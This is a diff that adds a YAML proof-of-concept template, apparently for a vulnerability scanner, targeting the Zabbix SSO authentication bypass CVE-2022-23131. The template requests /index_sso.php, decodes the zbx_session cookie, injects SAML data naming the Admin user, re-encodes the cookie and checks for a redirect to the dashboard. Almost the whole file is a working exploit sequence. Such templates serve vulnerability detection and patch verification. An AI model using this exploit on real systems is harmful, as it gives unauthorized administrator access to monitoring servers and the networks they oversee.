@@ -1,0 +1,32 @@
+name: poc-yaml-zabbix-sso-bypass
+manual: true
+transport: http
+rules:
+    r0:
+        request:
+            cache: false
+            method: GET
+            path: /index_sso.php
+            follow_redirects: false
+        expression: response.status == 302 && response.headers["set-cookie"].contains("zbx_session")
+        output:
+            search: '"zbx_session=(?P<zbx_session>[\\s\\S]+?)(;)?;".bsubmatch(response.raw)'
+            zbx_session: search["zbx_session"]
+            data: base64Decode(urldecode(zbx_session))
+            payload: 'urlencode(base64(data.replaceAll("{","{\"saml_data\":{\"username_attribute\":\"Admin\"},")))'
+    r1:
+        request:
+            cache: false
+            method: GET
+            path: /index_sso.php
+            follow_redirects: false
+            headers:
+                Cookie: 'zbx_session={{payload}};'
+        expression: response.status == 302 && response.headers["location"] == "zabbix.php?action=dashboard.view" && response.headers["set-cookie"].contains("zbx_session")
+
+expression: r0() && r1()
+detail:
+    author: envone77
+    description: "zabbix sso bypass CVE-2022-23131"
+    links:
+        - https://cn-sec.com/archives/794922.html
